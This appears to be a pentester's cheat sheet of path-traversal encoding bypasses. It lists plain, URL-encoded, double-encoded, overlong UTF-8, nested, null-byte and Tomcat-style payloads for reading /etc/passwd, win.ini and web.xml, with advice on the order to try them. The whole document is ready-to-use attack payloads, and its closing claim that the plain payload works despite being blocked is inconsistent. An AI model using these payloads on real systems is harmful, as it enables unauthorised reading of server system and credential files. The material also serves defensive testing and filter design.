# Traversal-encoding bypasses

Try in roughly this order — cheapest to most exotic. Each row shows the form of `../../etc/passwd`.

## 1. Plain
```
../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

## 2. URL-encoded (`.` → `%2e`, `/` → `%2f`, `\` → `%5c`)
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini
```
Beats simple string blocklists that match the literal `../`.

## 3. Double URL-encoded (`%` → `%25`)
```
%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252fetc%252fpasswd
```
Beats stacks that URL-decode once before the WAF and once again in the app.

## 4. UTF-8 overlong (Unicode normalization bypass — classic IIS / older Java)
```
%c0%ae%c0%ae%2f                  ( ../ )
%c0%2e%c0%2e%c0%2f
%c1%9c                            ( \  on IIS )
%c0%af                            ( /  overlong )
%fc%80%80%80%80%ae               ( . 6-byte overlong )
```

## 5. 16-bit Unicode (`%u00xx`) — older IIS
```
%u002e%u002e%u2215etc%u2215passwd
%u002e%u002e/etc/passwd
```

## 6. Mixed / nested traversal (beats `../` → `` strip-once filters)
```
....//....//....//etc/passwd
..././..././..././etc/passwd
..//..//..//etc/passwd
.\\./.\\./.\\./etc/passwd
```
If the filter strips one `../`, the remaining characters re-form into `../`.

## 7. Backslash on Linux apps that pass to PHP `realpath` after Windows-style normalize
```
..\/..\/..\/etc/passwd
```

## 8. Absolute path (skip traversal entirely)
Try this *first* if the parameter looks like it accepts full paths:
```
/etc/passwd
\windows\win.ini
file:///etc/passwd
```

## 9. Null-byte truncation (PHP < 5.3.4, unpatched legacy)
```
../../../../etc/passwd%00
../../../../etc/passwd%00.png
```

## 10. Suffix-defeat by length (modern PHP)
If the app appends `.php`, pad path with `/././...` past `PATH_MAX` (4096 bytes) to silently truncate the suffix.
```
/etc/passwd/././././././...(repeat)
```

## 11. Semicolon / matrix-param (Tomcat, some Java)
```
..;/..;/..;/etc/passwd
/..;/WEB-INF/web.xml
```

## 12. Question-mark / fragment confusion (when sink uses URL parser)
```
http://attacker/?/../../etc/passwd
```

## 13. Whitelist-extension bypass — wrappers that ignore appended suffix
See [php-wrappers.md](php-wrappers.md). `php://filter` reads the underlying file regardless of `.php` suffix on the parameter.

## Filter-fingerprinting quick test

Send `....//` and `..%252f` once each. If both pass and `../` is blocked, you know the filter is single-pass string-replace — every payload above (1, 3, 6) will work.
